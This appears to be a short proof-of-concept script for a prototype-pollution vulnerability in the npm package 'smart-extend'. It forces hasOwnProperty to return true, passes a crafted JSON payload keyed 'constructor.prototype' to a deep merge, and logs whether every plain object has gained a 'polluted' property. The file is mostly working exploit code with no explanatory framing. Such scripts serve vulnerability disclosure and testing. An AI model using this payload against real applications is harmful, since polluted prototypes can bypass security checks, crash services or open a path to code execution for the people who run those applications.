Object.prototype.hasOwnProperty = () => true;
var extend = require('smart-extend');
obj = {};
console.log({}.polluted);
var payload = '{"constructor.prototype": {"polluted":"yes"}}';
extend.deep({}, JSON.parse(payload));
console.log({}.polluted);